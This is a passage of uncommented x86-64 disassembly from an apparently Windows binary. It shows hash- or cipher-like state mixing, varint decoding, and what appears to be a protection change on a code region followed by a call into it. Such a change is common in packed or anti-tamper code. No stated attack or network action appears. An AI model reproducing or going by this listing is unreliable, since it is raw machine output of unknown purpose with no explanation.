   1400483f0:	mov    DWORD PTR [rbp+0x1180],eax
   1400483f6:	mov    eax,DWORD PTR [rsi+0x4]
   1400483f9:	mov    DWORD PTR [rbp+0x1170],eax
   1400483ff:	mov    eax,DWORD PTR [rsi+0x8]
   140048402:	mov    DWORD PTR [rbp+0x1178],eax
   140048408:	mov    eax,DWORD PTR [rsi+0xc]
   14004840b:	mov    DWORD PTR [rbp+0x1168],eax
   140048411:	mov    eax,DWORD PTR [rsi+0x10]
   140048414:	mov    DWORD PTR [rbp+0x1158],eax
   14004841a:	xorps  xmm0,xmm0
   14004841d:	lea    rsi,[rbp+0x1060]
   140048424:	movaps XMMWORD PTR [rsi+0x30],xmm0
   140048428:	movaps XMMWORD PTR [rsi+0x20],xmm0
   14004842c:	movaps XMMWORD PTR [rsi+0x10],xmm0
   140048430:	movaps XMMWORD PTR [rsi],xmm0
   140048433:	xor    r15d,r15d
   140048436:	lea    rdi,[rip+0x3fd13]        # 0x140088150
   14004843d:	lea    rbx,[rbp+0x7d0]
   140048444:	push   0x4
   140048446:	pop    r14
   140048448:	cmp    r15,0x14
   14004844c:	je     0x140048490
   14004844e:	lea    r12,[r15+0x4]
   140048452:	mov    rcx,r15
   140048455:	mov    rdx,r12
   140048458:	mov    r8,rsi
   14004845b:	mov    r9,rdi
   14004845e:	call   0x14003ad60
   140048463:	mov    ecx,DWORD PTR [rbp+r15*1+0xf80]
   14004846b:	mov    DWORD PTR [rbp+0x7d0],ecx
   140048471:	lea    rcx,[rip+0x3fcf0]        # 0x140088168
   140048478:	mov    QWORD PTR [rsp+0x20],rcx
   14004847d:	mov    rcx,rax
   140048480:	mov    r8,rbx
   140048483:	mov    r9,r14
   140048486:	call   0x1400638fe
   14004848b:	mov    r15,r12
   14004848e:	jmp    0x140048448
   140048490:	xorps  xmm0,xmm0
   140048493:	movaps XMMWORD PTR [rbp+0xd40],xmm0
   14004849a:	movaps XMMWORD PTR [rbp+0xd30],xmm0
   1400484a1:	movaps XMMWORD PTR [rbp+0xd20],xmm0
   1400484a8:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   1400484af:	xor    eax,eax
   1400484b1:	cmp    rax,0x40
   1400484b5:	je     0x1400484cd
   1400484b7:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   1400484be:	bswap  ecx
   1400484c0:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   1400484c7:	add    rax,0x4
   1400484cb:	jmp    0x1400484b1
   1400484cd:	movabs rax,0xd0636bfe7f012fd
   1400484d7:	imul   r13,rax
   1400484db:	mov    rax,r13
   1400484de:	shr    rax,0x20
   1400484e2:	xor    rax,r13
   1400484e5:	mov    rcx,QWORD PTR [rbp+0x1160]
   1400484ec:	shl    rcx,0x20
   1400484f0:	add    rcx,QWORD PTR [rbp+0x1140]
   1400484f7:	mov    rbx,rax
   1400484fa:	rol    rax,0x1d
   1400484fe:	xor    rax,rcx
   140048501:	push   0x3
   140048503:	pop    rcx
   140048504:	xor    edx,edx
   140048506:	div    rcx
   140048509:	mov    QWORD PTR [rbp+0xf78],rdx
   140048510:	mov    eax,DWORD PTR [rbp+0x1180]
   140048516:	mov    DWORD PTR [rbp+0x7d0],eax
   14004851c:	mov    eax,DWORD PTR [rbp+0x1170]
   140048522:	mov    DWORD PTR [rbp+0x7d4],eax
   140048528:	mov    eax,DWORD PTR [rbp+0x1178]
   14004852e:	mov    DWORD PTR [rbp+0x7d8],eax
   140048534:	mov    eax,DWORD PTR [rbp+0x1168]
   14004853a:	mov    DWORD PTR [rbp+0x7dc],eax
   140048540:	mov    eax,DWORD PTR [rbp+0x1158]
   140048546:	mov    DWORD PTR [rbp+0x7e0],eax
   14004854c:	and    DWORD PTR [rbp+0x7e4],0x0
   140048553:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   14004855a:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   140048561:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   140048568:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   14004856f:	movups XMMWORD PTR [rbp+0x7e8],xmm0
   140048576:	movups XMMWORD PTR [rbp+0x7f8],xmm1
   14004857d:	movups XMMWORD PTR [rbp+0x808],xmm2
   140048584:	movups XMMWORD PTR [rbp+0x818],xmm3
   14004858b:	call   0x140064214
   140048590:	mov    al,BYTE PTR [rip+0x504f7]        # 0x140098a8d
   140048596:	cmp    al,0x1
   140048598:	je     0x1400485de
   14004859a:	movzx  eax,al
   14004859d:	cmp    eax,0x2
   1400485a0:	je     0x1400486a8
   1400485a6:	lea    r9,[rbp+0x500]
   1400485ad:	and    DWORD PTR [r9],0x0
   1400485b1:	push   0x40
   1400485b3:	pop    r8
   1400485b5:	lea    rcx,[rip+0xfffffffffffb8ac4]        # 0x140001080
   1400485bc:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400485c3:	call   QWORD PTR [rip+0x4c23f]        # 0x140094808
   1400485c9:	test   eax,eax
   1400485cb:	sete   cl
   1400485ce:	inc    cl
   1400485d0:	mov    BYTE PTR [rip+0x504b7],cl        # 0x140098a8d
   1400485d6:	test   eax,eax
   1400485d8:	je     0x1400486a8
   1400485de:	mov    al,BYTE PTR [rip+0x505d4]        # 0x140098bb8
   1400485e4:	cmp    al,0x1
   1400485e6:	je     0x14004860f
   1400485e8:	movzx  eax,al
   1400485eb:	test   eax,eax
   1400485ed:	jne    0x1400486a8
   1400485f3:	call   0x140065d51
   1400485f8:	test   rax,rax
   1400485fb:	sete   cl
   1400485fe:	inc    cl
   140048600:	mov    BYTE PTR [rip+0x505b2],cl        # 0x140098bb8
   140048606:	test   rax,rax
   140048609:	je     0x1400486a8
   14004860f:	call   0x140064227
   140048614:	mov    eax,0xc8c291de
   140048619:	xchg   DWORD PTR [rip+0x504c1],eax        # 0x140098ae0
   14004861f:	call   QWORD PTR [rip+0x4c02b]        # 0x140094650
   140048625:	mov    eax,eax
   140048627:	mov    QWORD PTR [rip+0x4f9d2],rax        # 0x140098000
   14004862e:	lea    rsi,[rbp+0x7d0]
   140048635:	push   0xffffffffffffffff
   140048637:	pop    rdx
   140048638:	mov    rcx,rsi
   14004863b:	call   0x140001080
   140048640:	xor    eax,eax
   140048642:	xchg   DWORD PTR [rip+0x50498],eax        # 0x140098ae0
   140048648:	mov    BYTE PTR [rip+0x5043f],0x0        # 0x140098a8e
   14004864f:	mov    eax,DWORD PTR [rbp+0x1180]
   140048655:	add    eax,DWORD PTR [rsi]
   140048657:	mov    ecx,DWORD PTR [rbp+0x1170]
   14004865d:	add    ecx,DWORD PTR [rsi+0x4]
   140048660:	mov    edx,DWORD PTR [rbp+0x1178]
   140048666:	add    edx,DWORD PTR [rsi+0x8]
   140048669:	mov    r8d,DWORD PTR [rbp+0x1168]
   140048670:	add    r8d,DWORD PTR [rsi+0xc]
   140048674:	mov    r9d,DWORD PTR [rbp+0x1158]
   14004867b:	add    r9d,DWORD PTR [rsi+0x10]
   14004867f:	mov    BYTE PTR [rip+0x50406],0x0        # 0x140098a8c
   140048686:	mov    DWORD PTR [rbp+0x270],eax
   14004868c:	mov    DWORD PTR [rbp+0x274],ecx
   140048692:	mov    DWORD PTR [rbp+0x278],edx
   140048698:	mov    DWORD PTR [rbp+0x27c],r8d
   14004869f:	mov    DWORD PTR [rbp+0x280],r9d
   1400486a6:	jmp    0x1400486c0
   1400486a8:	mov    BYTE PTR [rip+0x503dd],0x0        # 0x140098a8c
   1400486af:	xorps  xmm0,xmm0
   1400486b2:	movaps XMMWORD PTR [rbp+0x270],xmm0
   1400486b9:	and    DWORD PTR [rbp+0x280],0x0
   1400486c0:	lea    rdx,[rbp+0x270]
   1400486c7:	movaps xmm0,XMMWORD PTR [rdx]
   1400486ca:	movaps XMMWORD PTR [rbp+0x1e0],xmm0
   1400486d1:	mov    eax,DWORD PTR [rdx+0x10]
   1400486d4:	mov    DWORD PTR [rbp+0x1f0],eax
   1400486da:	lea    rsi,[rbp+0xd0]
   1400486e1:	push   0x14
   1400486e3:	pop    r8
   1400486e5:	push   0x18
   1400486e7:	pop    r9
   1400486e9:	mov    rcx,rsi
   1400486ec:	call   0x140063f9d
   1400486f1:	mov    rsi,QWORD PTR [rsi]
   1400486f4:	lea    rcx,[rip+0x3b355]        # 0x140083a50
   1400486fb:	mov    edx,0x4000
   140048700:	call   0x14003bee8
   140048705:	mov    rdi,rdx
   140048708:	sub    rdi,0x10
   14004870c:	jb     0x14003cad1
   140048712:	mov    r12,rax
   140048715:	lea    rax,[rsi-0x41]
   140048719:	cmp    rax,0xffffffffffffffc0
   14004871d:	setb   al
   140048720:	test   rdi,rdi
   140048723:	sete   cl
   140048726:	or     cl,al
   140048728:	jne    0x14003cad1
   14004872e:	mov    rax,QWORD PTR [rbp+0x7c0]
   140048735:	shl    rax,0x20
   140048739:	add    rax,QWORD PTR [rbp+0xf60]
   140048740:	rol    rbx,0x7
   140048744:	xor    rbx,rax
   140048747:	movabs rax,0x9b5ee46738ad6439
   140048751:	mov    QWORD PTR [rbp+0x6b8],rbx
   140048758:	xor    rax,rbx
   14004875b:	mov    QWORD PTR [rbp+0x5e0],rax
   140048762:	lea    r15,[rbp+0xd8]
   140048769:	mov    rbx,r12
   14004876c:	add    r12,0x10
   140048770:	lea    r14,[rbp+0x270]
   140048777:	lea    rcx,[rbp+0x85c]
   14004877e:	mov    rdx,r14
   140048781:	call   0x14003ad8d
   140048786:	mov    rcx,r12
   140048789:	mov    rdx,rdi
   14004878c:	call   0x14003adcf
   140048791:	mul    rsi
   140048794:	mov    r8,rax
   140048797:	push   0xffffffffffffffff
   140048799:	pop    rax
   14004879a:	cmovo  r8,rax
   14004879e:	xor    edx,edx
   1400487a0:	lea    rcx,[rbp+0x7d8]
   1400487a7:	mov    QWORD PTR [rbp+0x1170],r12
   1400487ae:	mov    QWORD PTR [rcx-0x8],r12
   1400487b2:	mov    QWORD PTR [rcx],rdi
   1400487b5:	mov    QWORD PTR [rcx+0x8],rsi
   1400487b9:	mov    rax,QWORD PTR [r15+0x20]
   1400487bd:	mov    QWORD PTR [rcx+0x30],rax
   1400487c1:	mov    rax,r8
   1400487c4:	sub    rax,0x20
   1400487c8:	cmovb  rax,rdx
   1400487cc:	mov    QWORD PTR [rbp+0x1168],rax
   1400487d3:	movups xmm0,XMMWORD PTR [r15]
   1400487d7:	movups xmm1,XMMWORD PTR [r15+0x10]
   1400487dc:	movups XMMWORD PTR [rcx+0x10],xmm0
   1400487e0:	movups XMMWORD PTR [rcx+0x20],xmm1
   1400487e4:	xorps  xmm7,xmm7
   1400487e7:	and    QWORD PTR [rcx+0x48],0x0
   1400487ec:	movaps XMMWORD PTR [rcx+0x38],xmm7
   1400487f0:	mov    QWORD PTR [rcx+0x50],rdi
   1400487f4:	mov    rax,QWORD PTR [rbp+0x600]
   1400487fb:	mov    QWORD PTR [rcx+0x58],rax
   1400487ff:	mov    rax,QWORD PTR [rbp+0x4f0]
   140048806:	mov    QWORD PTR [rcx+0x60],rax
   14004880a:	mov    rax,QWORD PTR [rbp+0x7b8]
   140048811:	mov    QWORD PTR [rcx+0x68],rax
   140048815:	movaps xmm0,XMMWORD PTR [r14]
   140048819:	mov    eax,DWORD PTR [r14+0x10]
   14004881d:	mov    DWORD PTR [rcx+0x80],eax
   140048823:	movups XMMWORD PTR [rcx+0x70],xmm0
   140048827:	movaps XMMWORD PTR [rcx+0x98],xmm7
   14004882e:	movaps XMMWORD PTR [rcx+0xa8],xmm7
   140048835:	mov    QWORD PTR [rbp+0x1180],r8
   14004883c:	mov    QWORD PTR [rcx+0xb8],r8
   140048843:	lea    rcx,[rbp+0x500]
   14004884a:	push   0x4
   14004884c:	pop    rdx
   14004884d:	call   0x14003c111
   140048852:	xor    r14d,r14d
   140048855:	xor    r12d,r12d
   140048858:	xor    r15d,r15d
   14004885b:	xor    edi,edi
   14004885d:	xor    r13d,r13d
   140048860:	mov    QWORD PTR [rbp+0x1178],0x0
   14004886b:	cmp    QWORD PTR [rbp+0x1178],0x4
   140048873:	je     0x140048e6c
   140048879:	lea    rax,[r13+0x8]
   14004887d:	cmp    rax,QWORD PTR [rbp+0x1180]
   140048884:	jbe    0x14004888d
   140048886:	xor    edx,edx
   140048888:	jmp    0x140048e54
   14004888d:	cmp    rdi,0x8
   140048891:	jae    0x140048de2
   140048897:	cmp    r14,QWORD PTR [rbp+0x828]
   14004889e:	jae    0x1400488e7
   1400488a0:	mov    rax,QWORD PTR [rbp+0x7d8]
   1400488a7:	mov    rcx,QWORD PTR [rbp+0x818]
   1400488ae:	cmp    rcx,rax
   1400488b1:	jae    0x1400488e7
   1400488b3:	mov    rdx,QWORD PTR [rbp+0x1170]
   1400488ba:	movzx  r15d,BYTE PTR [rdx+rcx*1]
   1400488bf:	and    r15d,0x7f
   1400488c3:	lea    rdx,[rcx+0x1]
   1400488c7:	cmp    rdx,rax
   1400488ca:	jae    0x1400488f4
   1400488cc:	movzx  r8d,BYTE PTR [rbx+rcx*1+0x11]
   1400488d2:	test   r8b,r8b
   1400488d5:	jns    0x1400488ee
   1400488d7:	shl    r15,0x7
   1400488db:	and    r8d,0x7f
   1400488df:	or     r15,r8
   1400488e2:	mov    rcx,rdx
   1400488e5:	jmp    0x1400488c3
   1400488e7:	xor    edx,edx
   1400488e9:	jmp    0x140048d71
   1400488ee:	inc    rcx
   1400488f1:	mov    rax,rcx
   1400488f4:	mov    QWORD PTR [rbp+0x818],rax
   1400488fb:	mov    rax,r15
   1400488fe:	shr    rax,0x8
   140048902:	mov    rsi,r15
   140048905:	shr    rsi,0x28
   140048909:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140048910:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140048917:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004891e:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140048925:	mov    DWORD PTR [rbp+0xd10],eax
   14004892b:	lea    rax,[rip+0x3f726]        # 0x140088058
   140048932:	mov    QWORD PTR [rsp+0x20],rax
   140048937:	lea    rcx,[rbp+0xf80]
   14004893e:	push   0x4
   140048940:	pop    rdx
   140048941:	lea    r8,[rbp+0xd10]
   140048948:	mov    r9,rdx
   14004894b:	call   0x1400638fe
   140048950:	mov    BYTE PTR [rbp+0xf84],sil
   140048957:	mov    rsi,QWORD PTR [rbp+0x7f0]
   14004895e:	cmp    QWORD PTR [rbp+0x838],rsi
   140048965:	jbe    0x140048a91
   14004896b:	mov    r9,QWORD PTR [rbp+0x7f8]
   140048972:	cmp    r9,0x4
   140048976:	ja     0x140059d9c
   14004897c:	mov    rcx,QWORD PTR [rbp+0x800]
   140048983:	cmp    rcx,0x5
   140048987:	jae    0x140059dae
   14004898d:	mov    r14,QWORD PTR [rbp+0x838]
   140048994:	cmp    r14,rsi
   140048997:	je     0x140059dbc
   14004899d:	mov    r8,r14
   1400489a0:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   1400489a7:	mov    cl,BYTE PTR [rbp+0x808]
   1400489ad:	rol    eax,cl
   1400489af:	sub    r8,rsi
   1400489b2:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   1400489ba:	xor    edx,edx
   1400489bc:	div    r8
   1400489bf:	mov    rdi,rdx
   1400489c2:	mov    rax,QWORD PTR [rbp+0x840]
   1400489c9:	mov    QWORD PTR [rbp+0x1060],rax
   1400489d0:	cmp    rsi,0x40
   1400489d4:	push   0x40
   1400489d6:	pop    rax
   1400489d7:	cmovae rsi,rax
   1400489db:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   1400489e2:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   1400489e9:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   1400489f0:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   1400489f7:	lea    rcx,[rbp+0xd10]
   1400489fe:	mov    rdx,rsi
   140048a01:	call   0x14003c0b8
   140048a06:	test   r14,r14
   140048a09:	je     0x140048a57
   140048a0b:	mov    rcx,rax
   140048a0e:	mov    r8,rdx
   140048a11:	mov    rax,rdx
   140048a14:	add    rax,rdi
   140048a17:	mov    r9,QWORD PTR [rbp+0x830]
   140048a1e:	cmp    rax,r14
   140048a21:	jbe    0x140048a41
   140048a23:	xor    r10d,r10d
   140048a26:	cmp    r8,r10
   140048a29:	je     0x140048a57
   140048a2b:	lea    rax,[r10+rdi*1]
   140048a2f:	xor    edx,edx
   140048a31:	div    r14
   140048a34:	mov    al,BYTE PTR [r9+rdx*1]
   140048a38:	mov    BYTE PTR [rcx+r10*1],al
   140048a3c:	inc    r10
   140048a3f:	jmp    0x140048a26
   140048a41:	add    r9,rdi
   140048a44:	xor    eax,eax
   140048a46:	cmp    r8,rax
   140048a49:	je     0x140048a57
   140048a4b:	mov    dl,BYTE PTR [r9+rax*1]
   140048a4f:	mov    BYTE PTR [rcx+rax*1],dl
   140048a52:	inc    rax
   140048a55:	jmp    0x140048a46
   140048a57:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140048a5e:	xor    eax,eax
   140048a60:	cmp    rsi,rax
   140048a63:	je     0x140048a91
   140048a65:	cmp    rcx,0x3f
   140048a69:	ja     0x140059d8e
   140048a6f:	mov    edx,eax
   140048a71:	and    edx,0x7
   140048a74:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140048a7b:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140048a82:	inc    rax
   140048a85:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140048a8c:	inc    rcx
   140048a8f:	jmp    0x140048a60
   140048a91:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140048a98:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140048a9f:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140048aa6:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140048aad:	xor    eax,eax
   140048aaf:	cmp    rax,0x40
   140048ab3:	je     0x140048acb
   140048ab5:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140048abc:	bswap  ecx
   140048abe:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140048ac5:	add    rax,0x4
   140048ac9:	jmp    0x140048aaf
   140048acb:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140048ad2:	mov    eax,DWORD PTR [rbp+0x858]
   140048ad8:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140048adf:	mov    DWORD PTR [rbp+0xd20],eax
   140048ae5:	and    DWORD PTR [rbp+0xd24],0x0
   140048aec:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140048af3:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140048afa:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140048b01:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140048b08:	lea    rax,[rbp+0xd28]
   140048b0f:	movups XMMWORD PTR [rax+0x30],xmm3
   140048b13:	movups XMMWORD PTR [rax+0x20],xmm2
   140048b17:	movups XMMWORD PTR [rax+0x10],xmm1
   140048b1b:	movups XMMWORD PTR [rax],xmm0
   140048b1e:	call   0x140064214
   140048b23:	mov    al,BYTE PTR [rip+0x4ff64]        # 0x140098a8d
   140048b29:	cmp    al,0x1
   140048b2b:	je     0x140048b74
   140048b2d:	movzx  eax,al
   140048b30:	cmp    eax,0x2
   140048b33:	je     0x140048c1a
   140048b39:	and    DWORD PTR [rbp+0x400],0x0
   140048b40:	lea    rcx,[rip+0xfffffffffffb8539]        # 0x140001080
   140048b47:	mov    rdx,QWORD PTR [rbp+0x1150]
   140048b4e:	push   0x40
   140048b50:	pop    r8
   140048b52:	lea    r9,[rbp+0x400]
   140048b59:	call   QWORD PTR [rip+0x4bca9]        # 0x140094808
   140048b5f:	test   eax,eax
   140048b61:	sete   cl
   140048b64:	inc    cl
   140048b66:	mov    BYTE PTR [rip+0x4ff21],cl        # 0x140098a8d
   140048b6c:	test   eax,eax
   140048b6e:	je     0x140048c1a
   140048b74:	mov    al,BYTE PTR [rip+0x5003e]        # 0x140098bb8
   140048b7a:	cmp    al,0x1
   140048b7c:	je     0x140048ba1
   140048b7e:	movzx  eax,al
   140048b81:	test   eax,eax
   140048b83:	jne    0x140048c1a
   140048b89:	call   0x140065d51
   140048b8e:	test   rax,rax
   140048b91:	sete   cl
   140048b94:	inc    cl
   140048b96:	mov    BYTE PTR [rip+0x5001c],cl        # 0x140098bb8
   140048b9c:	test   rax,rax
   140048b9f:	je     0x140048c1a
   140048ba1:	call   0x140064227
   140048ba6:	mov    eax,0xc8c291de
   140048bab:	xchg   DWORD PTR [rip+0x4ff2f],eax        # 0x140098ae0
   140048bb1:	call   QWORD PTR [rip+0x4ba99]        # 0x140094650
   140048bb7:	mov    eax,eax
   140048bb9:	mov    QWORD PTR [rip+0x4f440],rax        # 0x140098000
   140048bc0:	lea    rcx,[rbp+0xd10]
   140048bc7:	push   0xffffffffffffffff
   140048bc9:	pop    rdx
   140048bca:	call   0x14002b840
   140048bcf:	xor    eax,eax
   140048bd1:	xchg   DWORD PTR [rip+0x4ff09],eax        # 0x140098ae0
   140048bd7:	mov    BYTE PTR [rip+0x4feb0],0x0        # 0x140098a8e
   140048bde:	mov    eax,DWORD PTR [rbp+0xd10]
   140048be4:	add    DWORD PTR [rbp+0x848],eax
   140048bea:	mov    eax,DWORD PTR [rbp+0xd14]
   140048bf0:	add    DWORD PTR [rbp+0x84c],eax
   140048bf6:	mov    eax,DWORD PTR [rbp+0xd18]
   140048bfc:	add    DWORD PTR [rbp+0x850],eax
   140048c02:	mov    eax,DWORD PTR [rbp+0xd1c]
   140048c08:	add    DWORD PTR [rbp+0x854],eax
   140048c0e:	mov    eax,DWORD PTR [rbp+0xd20]
   140048c14:	add    DWORD PTR [rbp+0x858],eax
   140048c1a:	mov    BYTE PTR [rip+0x4fe6b],0x0        # 0x140098a8c
   140048c21:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140048c28:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140048c2f:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140048c36:	xor    eax,eax
   140048c38:	cmp    rax,0x14
   140048c3c:	je     0x140048c54
   140048c3e:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140048c45:	bswap  ecx
   140048c47:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140048c4e:	add    rax,0x4
   140048c52:	jmp    0x140048c38
   140048c54:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140048c5b:	mov    eax,r15d
   140048c5e:	shr    eax,0x3
   140048c61:	and    eax,0x1f
   140048c64:	lea    rcx,[rax+rbp*1]
   140048c68:	add    rcx,0xd10
   140048c6f:	xor    r8d,r8d
   140048c72:	xor    edx,edx
   140048c74:	xor    eax,eax
   140048c76:	cmp    r8,0x10
   140048c7a:	je     0x140048c95
   140048c7c:	shld   rax,rdx,0x8
   140048c81:	mov    r9,rdx
   140048c84:	shl    r9,0x8
   140048c88:	movzx  edx,BYTE PTR [rcx+r8*1]
   140048c8d:	inc    r8
   140048c90:	or     rdx,r9
   140048c93:	jmp    0x140048c76
   140048c95:	push   0xffffffffffffffff
   140048c97:	pop    r8
   140048c99:	mov    r9,r8
   140048c9c:	mov    ecx,esi
   140048c9e:	shl    r9,cl
   140048ca1:	cmp    rsi,0x40
   140048ca5:	not    r9
   140048ca8:	cmovae r9,r8
   140048cac:	and    r15d,0x7
   140048cb0:	lea    ecx,[rsi+r15*1]
   140048cb4:	neg    cl
   140048cb6:	shrd   rdx,rax,cl
   140048cba:	shr    rax,cl
   140048cbd:	test   cl,0x40
   140048cc0:	cmove  rax,rdx
   140048cc4:	and    rax,r9
   140048cc7:	mov    r14,QWORD PTR [rbp+0x820]
   140048cce:	lea    r10,[rsi+0x7]
   140048cd2:	bswap  rax
   140048cd5:	shr    r10,0x3
   140048cd9:	mov    QWORD PTR [rbp+0x1060],rax
   140048ce0:	mov    r8,r14
   140048ce3:	imul   r8,r10
   140048ce7:	push   0x8
   140048ce9:	pop    rcx
   140048cea:	sub    rcx,r10
   140048ced:	dec    r10
   140048cf0:	lea    rax,[rbp+0x85c]
   140048cf7:	lea    r11,[rax+r8*1]
   140048cfb:	mov    rax,r8
   140048cfe:	xor    edx,edx
   140048d00:	push   0x14
   140048d02:	pop    rdi
   140048d03:	div    rdi
   140048d06:	cmp    rcx,0x8
   140048d0a:	je     0x140048d30
   140048d0c:	cmp    r10,0x7
   140048d10:	ja     0x140059d80
   140048d16:	imul   rax,rax,0xffffffffffffffec
   140048d1a:	mov    al,BYTE PTR [r11+rax*1]
   140048d1e:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140048d25:	inc    rcx
   140048d28:	inc    r11
   140048d2b:	inc    r8
   140048d2e:	jmp    0x140048cfb
   140048d30:	mov    rdx,QWORD PTR [rbp+0x1060]
   140048d37:	bswap  rdx
   140048d3a:	and    rdx,r9
   140048d3d:	inc    r14
   140048d40:	mov    QWORD PTR [rbp+0x820],r14
   140048d47:	mov    rax,QWORD PTR [rbp+0x890]
   140048d4e:	mov    QWORD PTR [rbp+0x1180],rax
   140048d55:	mov    r13,QWORD PTR [rbp+0x888]
   140048d5c:	mov    rdi,QWORD PTR [rbp+0x880]
   140048d63:	mov    r12,QWORD PTR [rbp+0x870]
   140048d6a:	mov    r15,QWORD PTR [rbp+0x878]
   140048d71:	mov    rax,QWORD PTR [rbp+0x1180]
   140048d78:	sub    rax,r13
   140048d7b:	sub    rax,rdi
   140048d7e:	cmp    rax,rsi
   140048d81:	cmovae rax,rsi
   140048d85:	cmp    rax,0x1
   140048d89:	adc    rax,0x0
   140048d8d:	mov    ecx,esi
   140048d8f:	sub    ecx,eax
   140048d91:	and    cl,0x3f
   140048d94:	cmp    rsi,rax
   140048d97:	movzx  ecx,cl
   140048d9a:	mov    r8d,0x0
   140048da0:	cmovbe ecx,r8d
   140048da4:	shr    rdx,cl
   140048da7:	mov    ecx,eax
   140048da9:	shld   r15,r12,cl
   140048dad:	shl    r12,cl
   140048db0:	test   al,0x40
   140048db2:	cmovne r15,r12
   140048db6:	mov    ecx,0x0
   140048dbb:	cmove  rcx,r12
   140048dbf:	or     rcx,rdx
   140048dc2:	mov    QWORD PTR [rbp+0x878],r15
   140048dc9:	mov    QWORD PTR [rbp+0x870],rcx
   140048dd0:	add    rdi,rax
   140048dd3:	mov    QWORD PTR [rbp+0x880],rdi
   140048dda:	mov    r12,rcx
   140048ddd:	jmp    0x14004888d
   140048de2:	add    rdi,0xfffffffffffffff8
   140048de6:	mov    rax,r12
   140048de9:	mov    ecx,edi
   140048deb:	shrd   rax,r15,cl
   140048def:	mov    rdx,r15
   140048df2:	shr    rdx,cl
   140048df5:	push   0xffffffffffffffff
   140048df7:	pop    r9
   140048df9:	mov    r8,r9
   140048dfc:	shl    r8,cl
   140048dff:	test   dil,0x40
   140048e03:	cmove  rdx,rax
   140048e07:	mov    rax,r9
   140048e0a:	cmovne rax,r8
   140048e0e:	mov    ecx,0x0
   140048e13:	cmove  rcx,r8
   140048e17:	mov    QWORD PTR [rbp+0x880],rdi
   140048e1e:	not    rcx
   140048e21:	not    rax
   140048e24:	and    rax,r15
   140048e27:	and    rcx,r12
   140048e2a:	test   rdi,rdi
   140048e2d:	cmove  rcx,rdi
   140048e31:	cmove  rax,rdi
   140048e35:	mov    QWORD PTR [rbp+0x878],rax
   140048e3c:	mov    QWORD PTR [rbp+0x870],rcx
   140048e43:	add    r13,0x8
   140048e47:	mov    QWORD PTR [rbp+0x888],r13
   140048e4e:	mov    r12,rcx
   140048e51:	mov    r15,rax
   140048e54:	inc    QWORD PTR [rbp+0x1178]
   140048e5b:	lea    rcx,[rbp+0x500]
   140048e62:	call   0x14003c141
   140048e67:	jmp    0x14004886b
   140048e6c:	mov    rax,QWORD PTR [rbp+0x500]
   140048e73:	mov    QWORD PTR [rbp+0x1180],rax
   140048e7a:	mov    r15,QWORD PTR [rbp+0x508]
   140048e81:	mov    rdi,QWORD PTR [rbp+0x510]
   140048e88:	lea    r9,[rip+0x3f169]        # 0x140087ff8
   140048e8f:	mov    rcx,r15
   140048e92:	mov    rdx,rdi
   140048e95:	xor    r8d,r8d
   140048e98:	call   0x14003c1d3
   140048e9d:	movzx  r14d,BYTE PTR [rax]
   140048ea1:	lea    r9,[rip+0x3f168]        # 0x140088010
   140048ea8:	push   0x1
   140048eaa:	pop    r8
   140048eac:	mov    rcx,r15
   140048eaf:	mov    rdx,rdi
   140048eb2:	call   0x14003c1d3
   140048eb7:	movzx  esi,BYTE PTR [rax]
   140048eba:	lea    r9,[rip+0x3f167]        # 0x140088028
   140048ec1:	push   0x2
   140048ec3:	pop    r8
   140048ec5:	mov    rcx,r15
   140048ec8:	mov    rdx,rdi
   140048ecb:	call   0x14003c1d3
   140048ed0:	movzx  r12d,BYTE PTR [rax]
   140048ed4:	lea    r9,[rip+0x3f165]        # 0x140088040
   140048edb:	push   0x3
   140048edd:	pop    r8
   140048edf:	mov    rcx,r15
   140048ee2:	mov    rdx,rdi
   140048ee5:	call   0x14003c1d3
   140048eea:	movzx  eax,BYTE PTR [rax]
   140048eed:	shl    eax,0x18
   140048ef0:	shl    r12d,0x10
   140048ef4:	shl    esi,0x8
   140048ef7:	or     rsi,r14
   140048efa:	or     rsi,r12
   140048efd:	or     rsi,rax
   140048f00:	mov    rcx,QWORD PTR [rbp+0x1168]
   140048f07:	shr    rcx,0x3
   140048f0b:	inc    rcx
   140048f0e:	mov    rax,rsi
   140048f11:	xor    edx,edx
   140048f13:	div    rcx
   140048f16:	lea    rax,[rdx*8+0x20]
   140048f1e:	lea    r13,[rbp+0x7d8]
   140048f25:	mov    QWORD PTR [r13+0xb8],rax
   140048f2c:	mov    QWORD PTR [r13+0x38],rdx
